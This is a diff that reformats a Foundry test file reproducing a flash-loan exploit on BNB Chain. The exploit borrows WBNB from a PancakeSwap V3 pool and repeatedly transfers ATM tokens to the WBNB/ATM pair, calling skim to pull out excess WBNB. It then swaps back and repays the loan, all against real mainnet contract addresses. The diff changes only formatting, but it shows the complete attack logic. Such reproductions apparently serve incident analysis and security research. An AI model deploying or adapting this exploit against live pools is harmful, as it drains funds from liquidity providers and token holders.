@@ -16,13 +16,11 @@ import {IWBNB} from "src/interfaces/IWBNB.sol";
 // Sandwitch attack,the contract will exchange token -> WBNB & WBNB -> USDT,So use transfer / skim to
 
 contract ContractTest is Test {
+
     IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
-    IUniswapV3Pair pool =
-        IUniswapV3Pair(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
-    IUniswapV2Pair wbnb_atm =
-        IUniswapV2Pair(0x1F5b26DCC6721c21b9c156Bf6eF68f51c0D075b7);
-    IUniswapV2Router router =
-        IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+    IUniswapV3Pair pool = IUniswapV3Pair(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
+    IUniswapV2Pair wbnb_atm = IUniswapV2Pair(0x1F5b26DCC6721c21b9c156Bf6eF68f51c0D075b7);
+    IUniswapV2Router router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 ATM = IERC20(0xa5957E0E2565dc93880da7be32AbCBdF55788888);
     uint256 constant PRECISION = 10 ** 18;
@@ -36,18 +34,10 @@ contract ContractTest is Test {
     }
 
     function testExploit() external {
-        emit log_named_decimal_uint(
-            "[Begin] Attacker USDT before exploit",
-            WBNB.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", WBNB.balanceOf(address(this)), 18);
         borrow_amount = WBNB.balanceOf(address(pool)) - 1e18;
         pool.flash(address(this), 0, borrow_amount, "");
-        emit log_named_decimal_uint(
-            "[End] Attacker USDT after exploit",
-            WBNB.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[End] Attacker USDT after exploit", WBNB.balanceOf(address(this)), 18);
     }
 
     function pancakeV3FlashCallback(
@@ -59,18 +49,14 @@ contract ContractTest is Test {
         console.log(WBNB.balanceOf(address(this)));
         uint256 i = 0;
         uint256 j = 0;
-        swap_token_to_token(
-            address(WBNB),
-            address(USDT),
-            WBNB.balanceOf(address(this)) - 170 ether
-        );
+        swap_token_to_token(address(WBNB), address(USDT), WBNB.balanceOf(address(this)) - 170 ether);
         while (j < 2) {
             swap_token_to_token(address(WBNB), address(ATM), 70 ether);
             while (i < 100) {
                 uint256 pair_wbnb = WBNB.balanceOf(address(wbnb_atm));
                 ATM.transfer(address(wbnb_atm), ATM.balanceOf(address(this)));
                 wbnb_atm.skim(address(this));
-                (, uint256 wbnb_r, ) = wbnb_atm.getReserves();
+                (, uint256 wbnb_r,) = wbnb_atm.getReserves();
                 uint256 pair_lost = (pair_wbnb - wbnb_r) / 1e18;
                 console.log("Pair lost:", pair_lost);
                 if (pair_lost == 7) {
@@ -86,7 +72,7 @@ contract ContractTest is Test {
             uint256 pair_wbnb = WBNB.balanceOf(address(wbnb_atm));
             ATM.transfer(address(wbnb_atm), ATM.balanceOf(address(this)));
             wbnb_atm.skim(address(this));
-            (, uint256 wbnb_r, ) = wbnb_atm.getReserves();
+            (, uint256 wbnb_r,) = wbnb_atm.getReserves();
             uint256 pair_lost = (pair_wbnb - wbnb_r) / 1e18;
             console.log("Pair lost:", pair_lost, "BNB");
             if (pair_lost == 0) {
@@ -94,35 +80,18 @@ contract ContractTest is Test {
             }
             i++;
         }
-        swap_token_to_token(
-            address(ATM),
-            address(WBNB),
-            ATM.balanceOf(address(this))
-        );
-        swap_token_to_token(
-            address(USDT),
-            address(WBNB),
-            USDT.balanceOf(address(this))
-        );
+        swap_token_to_token(address(ATM), address(WBNB), ATM.balanceOf(address(this)));
+        swap_token_to_token(address(USDT), address(WBNB), USDT.balanceOf(address(this)));
         console.log("My wbnb", WBNB.balanceOf(address(this)));
         WBNB.transfer(address(pool), (borrow_amount * 10_000) / 9975 + 1000);
     }
 
-    function swap_token_to_token(
-        address a,
-        address b,
-        uint256 amount
-    ) internal {
+    function swap_token_to_token(address a, address b, uint256 amount) internal {
         IERC20(a).approve(address(router), amount);
         address[] memory path = new address[](2);
         path[0] = address(a);
         path[1] = address(b);
-        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amount,
-            0,
-            path,
-            address(this),
-            block.timestamp
-        );
+        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
     }
+
 }
